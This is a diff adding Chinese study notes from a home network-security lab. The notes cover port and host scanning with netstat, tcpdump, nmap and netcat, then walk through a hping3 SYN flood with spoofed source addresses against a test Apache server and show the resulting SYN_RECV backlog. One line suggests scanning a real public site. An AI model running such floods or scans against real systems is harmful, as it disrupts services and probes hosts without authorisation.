@@ -504,3 +504,282 @@ ICMP Host Unreachable from 192.168.101.53 for ICMP Echo sent to 192.168.101.101
 
 fping -ag 192.168.101.0/24 > fping.txt
 只会将正常的也就是可以找到的存起来
+
+可以看一下端口通信
+┌──(root💀tyza66)-[~]
+└─# netstat -antup
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      89094/sshd: /usr/sb 
+tcp        0    164 192.168.101.53:22       192.168.101.96:61235    ESTABLISHED 90788/sshd: root@pt 
+tcp6       0      0 :::22                   :::*                    LISTEN      89094/sshd: /usr/sb 
+
+
+我们用tcpdump可以抓到数据包的数量
+┌──(root💀tyza66)-[~]
+└─# tcpdump -c 3 -i eth0 -n port 22
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+14:08:48.088612 IP 192.168.101.53.22 > 192.168.101.96.61235: Flags [P.], seq 1539324765:1539324961, ack 1577512350, win 2332, length 196
+14:08:48.143046 IP 192.168.101.96.61235 > 192.168.101.53.22: Flags [.], ack 196, win 4102, length 0
+14:08:48.164863 IP 192.168.101.53.22 > 192.168.101.96.61235: Flags [P.], seq 196:376, ack 1, win 2332, length 180
+3 packets captured
+4 packets received by filter
+0 packets dropped by kernel
+
+直接抓的是相对序列号 如果要抓绝对序列号需要加一个-S
+
+┌──(root💀tyza66)-[~]
+└─# tcpdump -c 3 -i eth0 -n port 22 -S
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+14:12:13.326362 IP 192.168.101.53.22 > 192.168.101.96.61235: Flags [P.], seq 1540470317:1540470513, ack 1577656942, win 2332, length 196
+14:12:13.344377 IP 192.168.101.53.22 > 192.168.101.96.61235: Flags [P.], seq 1540470513:1540470661, ack 1577656942, win 2332, length 148
+14:12:13.344752 IP 192.168.101.96.61235 > 192.168.101.53.22: Flags [.], ack 1540470661, win 4101, length 0
+3 packets captured
+3 packets received by filter
+0 packets dropped by kernel
+                             
+我们还可以用nmap进行半连接扫描
+nmap也能扫网段
+┌──(root💀tyza66)-[~]
+└─# nmap -sn 192.168.101.0/24 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 14:16 CST
+Nmap scan report for 192.168.101.1
+Host is up (0.0016s latency).
+MAC Address: A8:5A:E0:CE:86:F0 (Huawei Device)
+Nmap scan report for 192.168.101.26
+Host is up (0.014s latency).
+MAC Address: 00:21:6A:67:46:00 (Intel Corporate)
+Nmap scan report for 192.168.101.87
+Host is up (0.078s latency).
+MAC Address: 52:7B:4A:03:08:05 (Unknown)
+Nmap scan report for 192.168.101.93
+Host is up (0.048s latency).
+MAC Address: 42:48:AF:C0:07:62 (Unknown)
+Nmap scan report for 192.168.101.95
+Host is up (0.11s latency).
+MAC Address: C2:4F:A8:81:77:E0 (Unknown)
+Nmap scan report for 192.168.101.96
+Host is up (0.000080s latency).
+MAC Address: 38:68:93:8A:28:A2 (Intel Corporate)
+Nmap scan report for 192.168.101.53
+Host is up.
+Nmap done: 256 IP addresses (7 hosts up) scanned in 2.76 seconds
+
+全连接扫描会被记录 而半连接扫描不会留下记录
+就是不完成所有 就看对面有没有回的操作 直接就复位
+我们用wireshark也可以抓到半连接的包
+使用-sS指定半连接扫描
+┌──(root💀tyza66)-[~]
+└─# nmap -sS 192.168.101.96 -p 80,81,21,22,25,110,443
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 14:20 CST
+Nmap scan report for 192.168.101.96
+Host is up (0.00026s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+22/tcp  closed ssh
+25/tcp  closed smtp
+80/tcp  closed http
+81/tcp  closed hosts2-ns
+110/tcp closed pop3
+443/tcp closed https
+MAC Address: 38:68:93:8A:28:A2 (Intel Corporate)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
+
+┌──(root💀tyza66)-[~]
+└─# nmap -sS 192.168.101.96 -p 53,80,443             
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 14:21 CST
+Nmap scan report for 192.168.101.96
+Host is up (0.00017s latency).
+
+PORT    STATE  SERVICE
+53/tcp  closed domain
+80/tcp  closed http
+443/tcp closed https
+MAC Address: 38:68:93:8A:28:A2 (Intel Corporate)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
+
+还有我们可以用nc扫描
+如果我们想扫12306
+nmap -sS 12306.cn -p 1-1000 会发现开放的端口比较多 而且不是真实ip
+
+nc是netcat 是网络界的瑞士军刀 功能很全
+-n 直接使用ip地址 不通过域名服务器
+-v 显示指令执行过程
+-w 表示超时时间
+-z 表示使用0输入/输出模式,只在扫描通信端口时使用
+
+┌──(root💀tyza66)-[~]
+└─# nc -nv -w 1 -z 192.168.101.1 1-100
+(UNKNOWN) [192.168.101.1] 80 (http) open
+(UNKNOWN) [192.168.101.1] 53 (domain) open
+(UNKNOWN) [192.168.101.1] 21 (ftp) : Connection timed out
+
+
+sn洪水攻击
+主要利用tcp三次握手的机制
+一位内服务端返回WYN-ACK包的时候存在问题,如果来自一个不存在客户的信息那服务端就开始等, 成本小威力大
+使用hping3可以做这个事情 可以用来做压力测试或攻击实验
+
+咱们先搭建一个实验环境 去另一台主机上安装apache
+[root@192 ~]# yum install httpd -y
+已加载插件：fastestmirror, langpacks
+Loading mirror speeds from cached hostfile
+ * base: mirrors.aliyun.com
+ * extras: mirrors.aliyun.com
+ * updates: mirrors.aliyun.com
+正在解决依赖关系
+--> 正在检查事务
+---> 软件包 httpd.x86_64.0.2.4.6-99.el7.centos.1 将被 安装
+--> 正在处理依赖关系 httpd-tools = 2.4.6-99.el7.centos.1，它被软件包 httpd-2.4.6-99.el7.centos.1.x86_64 需要
+--> 正在处理依赖关系 /etc/mime.types，它被软件包 httpd-2.4.6-99.el7.centos.1.x86_64 需要
+--> 正在处理依赖关系 libaprutil-1.so.0()(64bit)，它被软件包 httpd-2.4.6-99.el7.centos.1.x86_64 需要
+--> 正在处理依赖关系 libapr-1.so.0()(64bit)，它被软件包 httpd-2.4.6-99.el7.centos.1.x86_64 需要
+--> 正在检查事务
+---> 软件包 apr.x86_64.0.1.4.8-7.el7 将被 安装
+---> 软件包 apr-util.x86_64.0.1.5.2-6.el7_9.1 将被 安装
+---> 软件包 httpd-tools.x86_64.0.2.4.6-99.el7.centos.1 将被 安装
+---> 软件包 mailcap.noarch.0.2.1.41-2.el7 将被 安装
+--> 解决依赖关系完成
+
+依赖关系解决
+
+===========================================================================================================================
+ Package                     架构                   版本                                     源                       大小
+===========================================================================================================================
+正在安装:
+ httpd                       x86_64                 2.4.6-99.el7.centos.1                    updates                 2.7 M
+为依赖而安装:
+ apr                         x86_64                 1.4.8-7.el7                              base                    104 k
+ apr-util                    x86_64                 1.5.2-6.el7_9.1                          updates                  92 k
+ httpd-tools                 x86_64                 2.4.6-99.el7.centos.1                    updates                  94 k
+ mailcap                     noarch                 2.1.41-2.el7                             base                     31 k
+
+事务概要
+===========================================================================================================================
+安装  1 软件包 (+4 依赖软件包)
+
+总下载量：3.0 M
+安装大小：10 M
+Downloading packages:
+(1/5): apr-1.4.8-7.el7.x86_64.rpm                                                                   | 104 kB  00:00:00     
+(2/5): apr-util-1.5.2-6.el7_9.1.x86_64.rpm                                                          |  92 kB  00:00:00     
+(3/5): httpd-tools-2.4.6-99.el7.centos.1.x86_64.rpm                                                 |  94 kB  00:00:00     
+(4/5): mailcap-2.1.41-2.el7.noarch.rpm                                                              |  31 kB  00:00:00     
+(5/5): httpd-2.4.6-99.el7.centos.1.x86_64.rpm                                                       | 2.7 MB  00:00:00     
+---------------------------------------------------------------------------------------------------------------------------
+总计                                                                                       2.3 MB/s | 3.0 MB  00:00:01     
+Running transaction check
+Running transaction test
+Transaction test succeeded
+Running transaction
+  正在安装    : apr-1.4.8-7.el7.x86_64                                                                                 1/5 
+  正在安装    : apr-util-1.5.2-6.el7_9.1.x86_64                                                                        2/5 
+  正在安装    : httpd-tools-2.4.6-99.el7.centos.1.x86_64                                                               3/5 
+  正在安装    : mailcap-2.1.41-2.el7.noarch                                                                            4/5 
+  正在安装    : httpd-2.4.6-99.el7.centos.1.x86_64                                                                     5/5 
+  验证中      : httpd-2.4.6-99.el7.centos.1.x86_64                                                                     1/5 
+  验证中      : mailcap-2.1.41-2.el7.noarch                                                                            2/5 
+  验证中      : apr-1.4.8-7.el7.x86_64                                                                                 3/5 
+  验证中      : httpd-tools-2.4.6-99.el7.centos.1.x86_64                                                               4/5 
+  验证中      : apr-util-1.5.2-6.el7_9.1.x86_64                                                                        5/5 
+
+已安装:
+  httpd.x86_64 0:2.4.6-99.el7.centos.1                                                                                     
+
+作为依赖被安装:
+  apr.x86_64 0:1.4.8-7.el7           apr-util.x86_64 0:1.5.2-6.el7_9.1      httpd-tools.x86_64 0:2.4.6-99.el7.centos.1     
+  mailcap.noarch 0:2.1.41-2.el7     
+
+完毕！
+[root@192 ~]# systemctl start httpd
+[root@192 ~]# iptables -F
+[root@192 ~]# 
+
+之后打开有一个测试页面
+然后咱们可以试试发起攻击 发1000 并且伪装ip
+-c 是数量
+-d 是发送到目标机器的每个数据包的大小 单位是字节
+-S 表示只发送SYN数据包
+-p 端口
+--flood 尽可能快地发送数据包 不考虑站的恢复
+--round-source 使用随机性的源头ip地址
+┌──(root💀tyza66)-[~]
+└─# hping3 -c 1000 -d 120 -S -p 80 --flood --rand-source 192.168.72.134
+HPING 192.168.72.134 (eth0 192.168.72.134): S set, 40 headers + 120 data bytes
+hping in flood mode, no replies will be shown
+
+之后回去被打的设备看
+netstat -antup | grep 80
+tcp6       0      0 :::80                   :::*                    LISTEN      32564/httpd
+
+就会发现很多很多 而且ip是到处的源ip      
+
+┌──(root💀tyza66)-[~]
+└─# hping3 -c 1000 -d 120 -S -p 80 --flood --rand-source 192.168.101.99 
+HPING 192.168.101.99 (eth0 192.168.101.99): S set, 40 headers + 120 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- 192.168.101.99 hping statistic ---
+815000 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+[root@localhost ~]# netstat -antup | grep 80
+tcp        0      0 192.168.101.99:80       241.104.151.210:2167    SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       30.219.173.190:2121     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       155.224.145.223:2141    SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       255.222.167.183:2082    SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       223.74.103.152:2166     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       141.237.107.156:2009    SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       62.211.36.58:2208       SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       250.58.194.157:2201     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       119.129.71.51:2065      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       159.152.56.69:2125      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       242.173.132.16:2003     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       181.14.167.197:2139     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       24.132.15.187:1994      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       141.71.232.48:1961      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       221.192.93.77:1971      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       82.55.222.36:2089       SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       168.111.21.92:2122      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       53.112.178.218:2068     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       82.91.215.119:2202      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       114.154.105.210:2113    SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       132.11.30.77:1989       SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       180.93.114.53:2115      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       149.52.199.75:2144      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       110.103.173.128:2134    SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       199.103.130.89:2130     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       152.71.158.210:2119     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       221.241.192.132:2087    SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       167.225.208.45:2050     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       111.55.199.119:1999     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       54.110.112.16:1969      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       52.189.123.130:1947     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       152.162.123.230:2014    SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       221.242.7.170:2190      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       175.170.246.245:1955    SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       126.129.93.31:1965      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       221.222.146.80:2106     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       215.114.7.17:1992       SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       82.175.157.152:2085     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       145.207.185.120:1987    SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       45.120.17.136:2039      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       1.150.180.199:2059      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       134.130.223.4:1986      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       28.7.93.156:2114        SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       55.193.218.1:2051       SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       63.115.221.14:2007      SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       111.107.119.14:2165     SYN_RECV    -                   
+tcp        0      0 192.168.101.99:80       223.254.89.241:1982     SYN_RECV    -  
+
+
+
+发现很多来自四面八方的请求以外发现访问网站也会很卡
+本地机器也会很卡
+直接对外网也可以攻击 但是无法伪造ip了 因为伪造的ip一旦过了路由器就无法伪装了 所以要伪造的话就要在内网攻击
+
+ 
